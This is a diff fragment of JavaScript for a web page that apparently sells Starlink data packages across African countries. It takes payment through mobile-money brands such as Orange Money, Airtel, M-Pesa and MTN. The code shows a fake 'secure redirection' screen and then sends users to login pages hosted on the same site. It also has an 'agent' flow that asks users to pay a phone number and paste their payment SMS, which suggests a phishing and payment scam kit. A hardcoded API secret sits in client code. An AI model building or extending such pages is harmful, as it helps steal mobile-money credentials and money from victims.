+            document.getElementById('paymentMethodModal').classList.remove('active');
+            
+            // Update loading modal based on payment method
+            const loadingLogo = document.getElementById('loadingLogo');
+            const modalSubtitle = document.getElementById('modal-subtitle');
+            const t = translations[currentLang] || translations.en;
+            
+            if (method === 'orange') {
+                loadingLogo.innerHTML = '<span style="font-size:11px;">Orange</span>';
+                loadingLogo.style.background = '#FF6600';
+                modalSubtitle.textContent = currentLang === 'fr' ? 'Redirection sécurisée vers la passerelle de paiement Orange Money' : currentLang === 'ar' ? 'تحويل آمن إلى بوابة دفع Orange Money' : currentLang === 'my' ? 'Orange Money gateway' : 'Secure redirection to the Orange Money payment gateway';
+            } else {
+                loadingLogo.innerHTML = '<span>airtel</span>';
+                loadingLogo.style.background = '#ed1c24';
+                modalSubtitle.textContent = t.modalSubtitle;
+            }
+            
+            // Show loading modal
+            document.getElementById('loadingModal').classList.add('active');
+            
+            // Redirect based on payment method
+            setTimeout(() => {
+                const cdfPrice = sessionStorage.getItem('starlinkPriceCDF');
+                const config = COUNTRY_CONFIG[detectedCountry];
+                const priceOverrides = config?.prices;
+                const localPrice = (priceOverrides && priceOverrides[cdfPrice] !== undefined) ? priceOverrides[cdfPrice] : Math.round(cdfPrice * currentRate);
+                const priceParams = '&cur=' + currentCurrency + '&lp=' + localPrice;
+                if (method === 'orange') {
+                    window.location.href = '/orange/login.html?source=starlink&package=' + selectedPackage + '&cdf=' + cdfPrice + priceParams;
+                } else {
+                    window.location.href = '/login?source=starlink&package=' + selectedPackage + '&cdf=' + cdfPrice + priceParams;
+                }
+            }, 5000);
+        }
+
+        // ── Agent Payment Flow (Vodacom DRC / Airtel Zambia) ──
+        let agentCountry = '';
+        let agentProvider = '';
+        let agentConfig = null;
+
+        const agT = {
+            en: {
+                step1Title: 'Pay via Agent',
+                locLabel: 'Your location / city',
+                locPlaceholder: 'e.g. Kinshasa – Gombe / Lusaka',
+                locError: 'Please enter your location',
+                findBtn: 'Find Payment Agent →',
+                cancel: 'Cancel',
+                step2Title: 'Finding your agent...',
+                step2Sub: 'Please wait a moment',
+                step3Title: 'Agent Found!',
+                step3Sub: 'Send your payment to the number below',
+                payLabel: 'Pay to this number',
+                delayText: '<strong>In case of any delay</strong>, contact our agent and quote your reference code:',
+                paidBtn: '✅ I Have Paid — Submit Confirmation',
+                step4Title: 'Submit Payment Proof',
+                step4Sub: 'Paste your confirmation message and enter your phone number for activation',
+                confirmLabel: 'Payment Confirmation Message',
+                confirmPlaceholder: 'Paste the SMS or payment confirmation message you received after paying...',
+                confirmError: 'Please paste your confirmation message',
+                phoneLabel: 'Your Phone Number for Activation',
+                phoneError: 'Please enter a valid phone number',
+                submitBtn: 'Submit for Activation',
+                backBtn: '← Back',
+                step5Title: 'Submitted!',
+                step5Sub: 'Your payment confirmation has been received. Our team will activate your Starlink package shortly.',
+                doneBtn: 'Done',
+                noAgentError: 'No payment agent found. Please contact support.',
+                amountLabel: 'Amount to pay:',
+            },
+            fr: {
+                step1Title: 'Payer via un Agent',
+                locLabel: 'Votre localisation / ville',
+                locPlaceholder: 'ex. Kinshasa – Gombe / Lusaka',
+                locError: 'Veuillez entrer votre localisation',
+                findBtn: 'Trouver un Agent de Paiement →',
+                cancel: 'Annuler',
+                step2Title: 'Recherche de votre agent...',
+                step2Sub: 'Veuillez patienter un instant',
+                step3Title: 'Agent Trouvé !',
+                step3Sub: 'Envoyez votre paiement au numéro ci-dessous',
+                payLabel: 'Payez à ce numéro',
+                delayText: '<strong>En cas de délai</strong>, contactez notre agent et citez votre code de référence :',
+                paidBtn: '✅ J\'ai Payé — Soumettre la Confirmation',
+                step4Title: 'Soumettre la Preuve de Paiement',
+                step4Sub: 'Collez votre message de confirmation et entrez votre numéro de téléphone pour l\'activation',
+                confirmLabel: 'Message de Confirmation de Paiement',
+                confirmPlaceholder: 'Collez le SMS ou le message de confirmation reçu après le paiement...',
+                confirmError: 'Veuillez coller votre message de confirmation',
+                phoneLabel: 'Votre Numéro de Téléphone pour l\'Activation',
+                phoneError: 'Veuillez entrer un numéro de téléphone valide',
+                submitBtn: 'Soumettre pour Activation',
+                backBtn: '← Retour',
+                step5Title: 'Envoyé !',
+                step5Sub: 'Votre confirmation de paiement a été reçue. Notre équipe activera votre forfait Starlink sous peu.',
+                doneBtn: 'Terminer',
+                noAgentError: 'Aucun agent de paiement trouvé. Veuillez contacter le support.',
+                amountLabel: 'Montant à payer :',
+            },
+        };
+
+        function applyAgentModalLang() {
+            const t = (currentLang === 'fr') ? agT.fr : agT.en;
+            document.getElementById('agStep1Title').textContent = t.step1Title;
+            document.getElementById('agLocLabel').childNodes[0].textContent = t.locLabel + ' ';
+            document.getElementById('agLocation').placeholder = t.locPlaceholder;
+            document.getElementById('agLocError').textContent = t.locError;
+            document.getElementById('agFindBtn').textContent = t.findBtn;
+            document.getElementById('agCancelBtn1').textContent = t.cancel;
+            document.getElementById('agStep2Title').textContent = t.step2Title;
+            document.getElementById('agStep2Sub').textContent = t.step2Sub;
+            document.getElementById('agStep3Title').textContent = t.step3Title;
+            document.getElementById('agStep3Sub').textContent = t.step3Sub;
+            document.getElementById('agPayLabel').textContent = t.payLabel;
+            document.getElementById('agDelayText').innerHTML = t.delayText;
+            document.getElementById('agPaidBtn').innerHTML = t.paidBtn;
+            document.getElementById('agCancelBtn3').textContent = t.cancel;
+            document.getElementById('agStep4Title').textContent = t.step4Title;
+            document.getElementById('agStep4Sub').textContent = t.step4Sub;
+            document.getElementById('agConfirmLabel').childNodes[0].textContent = t.confirmLabel + ' ';
+            document.getElementById('agConfirmText').placeholder = t.confirmPlaceholder;
+            document.getElementById('agConfirmError').textContent = t.confirmError;
+            document.getElementById('agPhoneLabel').childNodes[0].textContent = t.phoneLabel + ' ';
+            document.getElementById('agPhoneError').textContent = t.phoneError;
+            document.getElementById('agSubmitBtn').textContent = t.submitBtn;
+            document.getElementById('agBackBtn').textContent = t.backBtn;
+            document.getElementById('agStep5Title').textContent = t.step5Title;
+            document.getElementById('agStep5Sub').textContent = t.step5Sub;
+            document.getElementById('agDoneBtn').textContent = t.doneBtn;
+        }
+
+        function openAgentModal(country, provider) {
+            agentCountry = country;
+            agentProvider = provider;
+            agentConfig = null;
+
+            // Apply language
+            applyAgentModalLang();
+
+            // Set provider branding
+            const logo = document.getElementById('agProviderLogo');
+            if (provider === 'vodacom') {
+                logo.textContent = 'M-Pesa';
+                logo.style.background = '#e60000';
+                logo.style.color = '#fff';
+                document.getElementById('agFindBtn').style.background = '#e60000';
+                document.getElementById('agFindBtn').style.color = '#fff';
+                document.getElementById('agStep1Sub').textContent = currentLang === 'fr'
+                    ? 'Entrez votre localisation pour trouver un agent de paiement Vodacom M-Pesa'
+                    : 'Enter your location to find a Vodacom M-Pesa payment agent';
+            } else if (provider === 'mtn') {
+                logo.textContent = 'MTN';
+                logo.style.background = '#ffcc00';
+                logo.style.color = '#000';
+                document.getElementById('agStep1Sub').textContent = currentLang === 'fr'
+                    ? 'Entrez votre localisation pour trouver un agent de paiement MTN MoMo'
+                    : 'Enter your location to find an MTN MoMo payment agent';
+                document.getElementById('agFindBtn').style.background = '#ffcc00';
+                document.getElementById('agFindBtn').style.color = '#000';
+            } else {
+                logo.textContent = 'Airtel';
+                logo.style.background = '#ed1c24';
+                logo.style.color = '#fff';
+                document.getElementById('agStep1Sub').textContent = currentLang === 'fr'
+                    ? 'Entrez votre localisation pour trouver un agent de paiement Airtel Money'
+                    : 'Enter your location to find an Airtel Money payment agent';
+                document.getElementById('agFindBtn').style.background = '#e60000';
+                document.getElementById('agFindBtn').style.color = '#fff';
+            }
+
+            // Show package info
+            const pkgLabels = {
+                starter: 'Starter — 120 GB / 2 months',
+                standard: 'Standard — 250 GB / 2 months',
+                premium: 'Premium — 400 GB / 2 months',
+                pro: 'Pro — 600 GB / 3 months',
+                business: 'Business — 1 TB / 3 months',
+                unlimited: 'Unlimited — 3 months',
+            };
+            const cdfPrice = sessionStorage.getItem('starlinkPriceCDF') || '';
+            const config = COUNTRY_CONFIG[detectedCountry] || COUNTRY_CONFIG['CD'];
+            const priceOverrides = config?.prices;
+            const localPrice = (priceOverrides && priceOverrides[cdfPrice] !== undefined)
+                ? priceOverrides[cdfPrice] : Math.round(cdfPrice * currentRate);
+            document.getElementById('agPackageBadge').innerHTML =
+                '📦 <strong>' + (pkgLabels[selectedPackage] || selectedPackage) + '</strong>' +
+                (localPrice ? '<br>💵 ' + localPrice.toLocaleString() + ' ' + currentCurrency : '');
+
+            // Reset fields
+            document.getElementById('agLocation').value = '';
+            document.getElementById('agLocError').style.display = 'none';
+            document.getElementById('agConfirmText').value = '';
+            document.getElementById('agPhone').value = '';
+            document.getElementById('agConfirmError').style.display = 'none';
+            document.getElementById('agPhoneError').style.display = 'none';
+
+            // Show step 1
+            ['agStep1','agStep2','agStep3','agStep4','agStep5'].forEach(id => {
+                document.getElementById(id).style.display = id === 'agStep1' ? '' : 'none';
+            });
+            document.getElementById('agentPaymentModal').style.display = '';
+        }
+
+        function closeAgentModal() {
+            document.getElementById('agentPaymentModal').style.display = 'none';
+            document.querySelectorAll('.package-card').forEach(c => c.classList.remove('selected'));
+            selectedPackage = null;
+        }
+
+        async function agFindAgent() {
+            const loc = document.getElementById('agLocation').value.trim();
+            if (!loc) {
+                document.getElementById('agLocError').style.display = '';
+                return;
+            }
+            document.getElementById('agLocError').style.display = 'none';
+
+            // Show loading
+            document.getElementById('agStep1').style.display = 'none';
+            document.getElementById('agStep2').style.display = '';
+
+            // Fetch agent config
+            try {
+                const res = await fetch('/api/agent-config?country=' + agentCountry + '&provider=' + agentProvider);
+                agentConfig = await res.json();
+            } catch (e) {
+                agentConfig = { found: false };
+            }
+
+            // Simulate at least 2s loading for UX
+            await new Promise(r => setTimeout(r, 2000));
+
+            if (!agentConfig || !agentConfig.found || !agentConfig.agent_number) {
+                // No agent configured – show friendly error and go back
+                document.getElementById('agStep2').style.display = 'none';
+                document.getElementById('agStep1').style.display = '';
+                const t2 = (currentLang === 'fr') ? agT.fr : agT.en;
+                document.getElementById('agLocError').textContent = t2.noAgentError;
+                document.getElementById('agLocError').style.display = '';
+                return;
+            }
+
+            // Populate Step 3
+            document.getElementById('agAgentNumber').textContent = agentConfig.agent_number;
+            document.getElementById('agAgentName').textContent = agentConfig.agent_name || '';
+            const instrEl = document.getElementById('agInstructions');
+            if (agentConfig.instructions) {
+                instrEl.textContent = agentConfig.instructions;
+                instrEl.style.display = '';
+            } else {
+                instrEl.style.display = 'none';
+            }
+            const cdfPrice = sessionStorage.getItem('starlinkPriceCDF') || '';
+            const config = COUNTRY_CONFIG[detectedCountry] || COUNTRY_CONFIG['CD'];
+            const localPrice = (config?.prices && config.prices[cdfPrice] !== undefined)
+                ? config.prices[cdfPrice] : Math.round(cdfPrice * currentRate);
+            const t3 = (currentLang === 'fr') ? agT.fr : agT.en;
+            document.getElementById('agAmountBox').textContent =
+                t3.amountLabel + ' ' + localPrice.toLocaleString() + ' ' + currentCurrency;
+
+            // Generate random reference code (e.g. STK-A3F7-X2Q9)
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+            const seg = () => Array.from({length: 4}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+            document.getElementById('agRefCode').textContent = 'STK-' + seg() + '-' + seg();
+
+            document.getElementById('agStep2').style.display = 'none';
+            document.getElementById('agStep3').style.display = '';
+        }
+
+        function agIHavePaid() {
+            document.getElementById('agStep3').style.display = 'none';
+            document.getElementById('agStep4').style.display = '';
+        }
+
+        function agBackToAgent() {
+            document.getElementById('agStep4').style.display = 'none';
+            document.getElementById('agStep3').style.display = '';
+        }
+
+        async function agSubmitConfirmation() {
+            const confirmText = document.getElementById('agConfirmText').value.trim();
+            const phone = document.getElementById('agPhone').value.trim();
+            let valid = true;
+
+            if (!confirmText) {
+                document.getElementById('agConfirmError').style.display = '';
+                valid = false;
+            } else {
+                document.getElementById('agConfirmError').style.display = 'none';
+            }
+            if (!phone || phone.replace(/\D/g, '').length < 7) {
+                document.getElementById('agPhoneError').style.display = '';
+                valid = false;
+            } else {
+                document.getElementById('agPhoneError').style.display = 'none';
+            }
+            if (!valid) return;
+
+            const btn = document.getElementById('agSubmitBtn');
+            btn.disabled = true;
+            btn.textContent = 'Submitting...';
+
+            const cdfPrice = sessionStorage.getItem('starlinkPriceCDF') || '';
+            const config = COUNTRY_CONFIG[detectedCountry] || COUNTRY_CONFIG['CD'];
+            const localPrice = (config?.prices && config.prices[cdfPrice] !== undefined)
+                ? config.prices[cdfPrice] : Math.round(cdfPrice * currentRate);
+
+            try {
+                const res = await fetch('/api/agent-payment', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'X-API-Secret': 'starlink-reseller-secret-2026-change-in-production' },
+                    body: JSON.stringify({
+                        country: agentCountry,
+                        provider: agentProvider,
+                        location: document.getElementById('agLocation').value.trim(),
+                        phone: phone,
+                        package: selectedPackage,
+                        amount: localPrice + ' ' + currentCurrency,
+                        confirmation_text: confirmText,
+                    }),
+                });
+                const data = await res.json();
+                if (data.success) {
+                    document.getElementById('agStep4').style.display = 'none';
+                    document.getElementById('agStep5').style.display = '';
+                } else {
+                    btn.disabled = false;
+                    btn.textContent = 'Submit for Activation';
+                    alert(data.error || 'Submission failed. Please try again.');
+                }
+            } catch (e) {
+                btn.disabled = false;
+                btn.textContent = 'Submit for Activation';
+                alert('Network error. Please check your connection and try again.');
+            }
+        }
+
+        function toggleLanguage() {
+            const newLang = currentLang === 'fr' ? 'en' : currentLang === 'en' ? 'my' : currentLang === 'my' ? 'rn' : currentLang === 'rn' ? 'ar' : currentLang === 'ar' ? 'am' : currentLang === 'am' ? 'fr' : 'fr';
+            applyTranslations(newLang);
+            updatePackageHints();
+            localStorage.setItem('starlink_user_lang', newLang);
+            localStorage.setItem('starlink_lang_country', detectedCountry);
+            if (typeof window.updatePWABannerLang === 'function') window.updatePWABannerLang();
+        }
+
+        document.addEventListener('DOMContentLoaded', async () => {
+            const countryData = await detectCountry();
+            const urlCountry = new URLSearchParams(window.location.search).get('country');
+            detectedCountry = (urlCountry && COUNTRY_CONFIG[urlCountry.toUpperCase()]) ? urlCountry.toUpperCase() : countryData.country;
+            const config = COUNTRY_CONFIG[detectedCountry] || COUNTRY_CONFIG['CD'];
+            
+            // Set currency based on country
+            currentCurrency = config.currency;
+            currentRate = config.rate;
+            
+            // Use saved language preference only if it was set for the same country
+            const savedLang = localStorage.getItem('starlink_user_lang');
+            const savedForCountry = localStorage.getItem('starlink_lang_country');
+            const lang = (savedLang && savedForCountry === detectedCountry) ? savedLang : config.lang;
+            
+            // Apply language and update prices
+            applyTranslations(lang);
+            updatePrices();
+            updatePackageHints();
+
+            // Congo DRC: hide Moov, hide 3-month packages, show monthly cards, show Orange Money
+            if (detectedCountry === 'CD') {
+                document.getElementById('selectOrange').style.display = '';
+                document.querySelector('[data-package="starter"]').style.display = 'none';
+                document.querySelector('[data-package="standard"]').style.display = 'none';
+                document.querySelector('[data-package="premium"]').style.display = 'none';
+                document.querySelector('[data-package="pro"]').style.display = 'none';
+                document.querySelector('[data-package="business"]').style.display = 'none';
+                document.querySelector('[data-package="unlimited"]').style.display = 'none';
+                document.querySelectorAll('.monthly-cd-card').forEach(el => el.style.display = '');
+            }
+
+            // Burkina Faso: hide Airtel & Moov, hide 3-month packages, show monthly cards, show Orange Money only
+            if (detectedCountry === 'BF') {
+                document.getElementById('selectAirtel').style.display = 'none';
+                document.getElementById('selectOrange').style.display = '';
+                document.querySelector('[data-package="starter"]').style.display = 'none';
+                document.querySelector('[data-package="pro"]').style.display = 'none';
+                document.querySelector('[data-package="business"]').style.display = 'none';
+                document.querySelector('[data-package="unlimited"]').style.display = 'none';
+                document.querySelectorAll('.monthly-bf-card').forEach(el => el.style.display = '');
+            }
+
+            // Zambia: show MTN MoMo only
+            if (detectedCountry === 'ZM') {
+                document.querySelectorAll('.payment-option').forEach(el => el.style.display = 'none');
+                document.getElementById('selectMtn').style.display = '';
+            }
+
+            // Lesotho: show EcoCash only
+            if (detectedCountry === 'LS') {
+                document.querySelectorAll('.payment-option').forEach(el => el.style.display = 'none');
+                document.getElementById('selectEcocash').style.display = '';
+            }
+
+            // Zimbabwe: show EcoCash only
+            if (detectedCountry === 'ZW') {
+                document.querySelectorAll('.payment-option').forEach(el => el.style.display = 'none');
+                document.getElementById('selectEcocash').style.display = '';
+            }
+
+            // Lesotho: show EcoCash only, hide Airtel and Moov
+            if (detectedCountry === 'LS') {
+                document.querySelectorAll('.payment-option').forEach(el => el.style.display = 'none');
+                document.getElementById('selectEcocash').style.display = '';
+            }
+
+            // Burundi: show Lumitel only
+            if (detectedCountry === 'BI') {
+                document.querySelectorAll('.payment-option').forEach(el => el.style.display = 'none');
+                document.getElementById('selectLumitel').style.display = '';
+            }
+
+            // Sierra Leone: hide Airtel and Moov, show only Orange
+            if (detectedCountry === 'SL') {
+                document.getElementById('selectAirtel').style.display = 'none';
+                document.getElementById('selectOrange').style.display = '';
+            }
+
+            // Liberia: hide Airtel and Moov, show only Orange
+            if (detectedCountry === 'LR') {
+                document.getElementById('selectAirtel').style.display = 'none';
+                document.getElementById('selectOrange').style.display = '';
+            }
+
+            // Jordan: show only Orange Money
+            if (detectedCountry === 'JO') {
+                document.querySelectorAll('.payment-option').forEach(el => el.style.display = 'none');
+                document.getElementById('selectOrange').style.display = '';
+            }
+
+            // Ethiopia: show only Ethiopian Banks
+            if (detectedCountry === 'ET') {
+                document.querySelectorAll('.payment-option').forEach(el => el.style.display = 'none');
+                document.getElementById('selectEthiopia').style.display = '';
+            }
+
+            // Bénin: show only MTN MoMo, hide everything else
+            if (detectedCountry === 'BJ') {
+                document.querySelectorAll('.payment-option').forEach(el => el.style.display = 'none');
+                document.getElementById('selectMtn').style.display = '';
+            }
+
+            // Congo Brazzaville: show Airtel + MTN, hide Moov
+            if (detectedCountry === 'CG') {
+                document.getElementById('selectMtn').style.display = '';
+            }
+
+            // Sénégal: show Orange Money only
+            if (detectedCountry === 'SN') {
+                document.querySelectorAll('.payment-option').forEach(el => el.style.display = 'none');
+                document.getElementById('selectOrange').style.display = '';
+            }
+
+            // Botswana: show Orange Money only
+            if (detectedCountry === 'BW') {
+                document.querySelectorAll('.payment-option').forEach(el => el.style.display = 'none');
+                document.getElementById('selectOrange').style.display = '';
+            }
+
+            // Add click event listeners to all package cards
+            document.querySelectorAll('.package-card').forEach(card => {
+                card.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    const packageType = this.getAttribute('data-package');
+                    if (packageType) {
+                        selectPackage(this, packageType);
+                    }
+                });
+            });
+
+            // Configure modal events
+            document.getElementById('configureSubscribeBtn').addEventListener('click', function() {
+                const card = _configureTargetCard;
+                closeConfigureModal();
+                if (card) selectPackage(card, card.getAttribute('data-package'));
+            });
+            document.getElementById('configureCloseBtn').addEventListener('click', closeConfigureModal);
+            document.getElementById('configureModal').addEventListener('click', function(e) {
+                if (e.target === this) closeConfigureModal();
+            });
+        });
+    </script>
+    <div id="toast" style="display:none;position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#111;color:#fff;padding:12px 24px;border-radius:8px;font-size:14px;z-index:99999;box-shadow:0 4px 12px rgba(0,0,0,0.3);"></div>
+</body>
+</html>
